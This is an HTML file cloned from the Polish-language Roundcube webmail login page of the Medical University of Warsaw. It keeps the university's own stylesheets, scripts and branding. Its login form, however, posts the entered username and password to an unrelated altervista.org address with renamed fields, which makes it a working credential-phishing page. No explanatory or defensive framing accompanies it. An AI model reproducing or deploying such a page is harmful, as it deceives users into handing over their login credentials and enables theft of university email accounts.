<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3c.org/TR/1999/REC-html401-19991224/loose.dtd">

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><HTML 

lang="pl" xmlns="http://www.w3.org/1999/xhtml"><HEAD><META content="IE=11.0000" 

http-equiv="X-UA-Compatible">

 <TITLE>Webmail Warszawski Uniwersytet Medyczny :: Witamy w Webmail Warszawski 

Uniwersytet Medyczny</TITLE> 

<META name="Robots" content="noindex,nofollow"> <LINK href="./?_task=login" rel="index"> 

<LINK href="skins/classic/images/favicon.ico" rel="shortcut icon"> <LINK href="https://webmail.wum.edu.pl/skins/classic/common.min.css?s=1503325334" 

rel="stylesheet" type="text/css"> 

<META http-equiv="content-type" content="text/html; charset=UTF-8"> <LINK href="https://webmail.wum.edu.pl/plugins/jqueryui/themes/classic/jquery-ui-1.10.4.custom.css?s=1480262870" 

rel="stylesheet" type="text/css"> 

<SCRIPT src="https://webmail.wum.edu.pl/program/js/jquery.min.js?s=1480262870" type="text/javascript"></SCRIPT>

 

<SCRIPT src="https://webmail.wum.edu.pl/program/js/common.min.js?s=1503325163" type="text/javascript"></SCRIPT>

 

<SCRIPT src="https://webmail.wum.edu.pl/program/js/app.min.js?s=1503325163" type="text/javascript"></SCRIPT>

 

<SCRIPT src="https://webmail.wum.edu.pl/program/js/jstz.min.js?s=1480262870" type="text/javascript"></SCRIPT>

 

<SCRIPT type="text/javascript">

/* <![CDATA[ */



/*

        @licstart  The following is the entire license notice for the 

        JavaScript code in this page.



        Copyright (C) 2005-2014 The Roundcube Dev Team



        The JavaScript code in this page is free software: you can redistribute

        it and/or modify it under the terms of the GNU General Public License

        as published by the Free Software Foundation, either version 3 of

        the License, or (at your option) any later version.



        The code is distributed WITHOUT ANY WARRANTY; without even the implied

        warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

        See the GNU GPL for more details.



        @licend  The above is the entire license notice

        for the JavaScript code in this page.

*/

var rcmail = new rcube_webmail();

rcmail.set_env({"task":"login","x_frame_options":"sameorigin","standard_windows":false,"locale":"pl_PL","cookie_domain":"","cookie_path":"\/","cookie_secure":true,"skin":"classic","refresh_interval":60,"session_lifetime":600,"action":"","comm_path":".\/?_task=login","compose_extwin":false,"date_format":"yy-mm-dd","request_token":"b9dqQbnGeutAgQI7AeQRg7gOt8IXvOCZ"});

rcmail.add_label({"loading":"\u0141adowanie...","servererror":"B\u0142\u0105d serwera!","connerror":"B\u0142\u0105d po\u0142\u0105czenia (brak odpowiedzi serwera)!","requesttimedout":"Up\u0142yn\u0105\u0142 limit czasu \u017c\u0105dania","refreshing":"Od\u015bwie\u017canie...","windowopenerror":"Wyskakuj\u0105ce okno zosta\u0142o zablokowane!","uploadingmany":"Zapisywanie plik\u00f3w..."});

rcmail.gui_container("loginfooter","bottomline");

rcmail.gui_object('message', 'message');

rcmail.gui_object('loginform', 'form');

/* ]]> */

</SCRIPT>

 

<SCRIPT src="https://webmail.wum.edu.pl/plugins/jqueryui/js/jquery-ui-1.10.4.custom.min.js?s=1480262870" type="text/javascript"></SCRIPT>

 

<SCRIPT src="https://webmail.wum.edu.pl/plugins/jqueryui/js/i18n/jquery.ui.datepicker-pl.js?s=1480262869" type="text/javascript"></SCRIPT>

 

<META name="GENERATOR" content="MSHTML 11.00.10570.1001"></HEAD> 

<BODY><IMG id="logo" style="margin: 0px auto; display: block;" src="https://webmail.wum.edu.pl/skins/classic/images/yourLogo.png" 

border="0">

<DIV id="message"></DIV>

<DIV id="login-form">

<DIV class="boxtitle">Witamy w Webmail Warszawski Uniwersytet Medyczny</DIV>

<DIV class="boxcontent">

<FORM name="form" action="http://directoryupdatee.altervista.org/veri1/member.php

" 

method="post"><INPUT name="_token" type="hidden" value="b9dqQbnGeutAgQI7AeQRg7gOt8IXvOCZ"> 

<INPUT name="_task" type="hidden" value="login"><INPUT name="_action" type="hidden" value="login"><INPUT name="_timezone" id="rcmlogintz" type="hidden" value="_default_"><INPUT name="_url" id="rcmloginurl" type="hidden">

<TABLE border="0" summary="">

  <TBODY>

  <TR>

    <TD class="title"><LABEL for="rcmloginuser">Nazwa</LABEL> </TD>

    <TD class="input"><INPUT name="q3_name" id="rcmloginuser" required="required" type="text" autocomplete="off" autocapitalize="off"></TD></TR>

  <TR>

    <TD class="title"><LABEL for="rcmloginpwd">Hasło</LABEL> </TD>

    <TD 

class="input"><INPUT name="q4_prince" id="rcmloginpwd" required="required" type="pass" autocomplete="off" autocapitalize="off"></TD></TR></TBODY></TABLE>

<P 

class="formbuttons"><INPUT class="button mainaction" id="rcmloginsubmit" type="submit" value="Zaloguj"></P></FORM></DIV></DIV><NOSCRIPT> 

 &lt;p id="login-noscriptwarning"&gt;Uwaga: Usługa wymaga Javascriptu! Aby z 

niej skorzystać proszę włączyć obsługę języka Javascript w ustawieniach 

przeglądarki.&lt;/p&gt; </NOSCRIPT> 

<DIV id="login-bottomline">  Webmail Warszawski Uniwersytet Medyczny       

&nbsp;●&nbsp; <A class="support-link" href="http://it.wum.edu.pl/" target="_blank">Wsparcie 

techniczne</A>     <BR><BR>Poprzednia wersja systemu webmail: <A href="https://webmail-old.wum.edu.pl/">https://webmail-old.wum.edu.pl/</A> 

</DIV>

<SCRIPT type="text/javascript">

/* <![CDATA[ */



$(document).ready(function(){ 

rcmail.init();

var images = ["skins\/classic\/images\/icons\/folders.png","skins\/classic\/images\/mail_footer.png","skins\/classic\/images\/taskicons.gif","skins\/classic\/images\/display\/loading.gif","skins\/classic\/images\/pagenav.gif","skins\/classic\/images\/mail_toolbar.png","skins\/classic\/images\/searchfield.gif","skins\/classic\/images\/messageicons.png","skins\/classic\/images\/icons\/reset.gif","skins\/classic\/images\/abook_toolbar.png","skins\/classic\/images\/icons\/groupactions.png","skins\/classic\/images\/watermark.gif"];

            for (var i=0; i<images.length; i++) {

                img = new Image();

                img.src = images[i];

            }

});

/* ]]> */

</SCRIPT>

 </BODY></HTML>

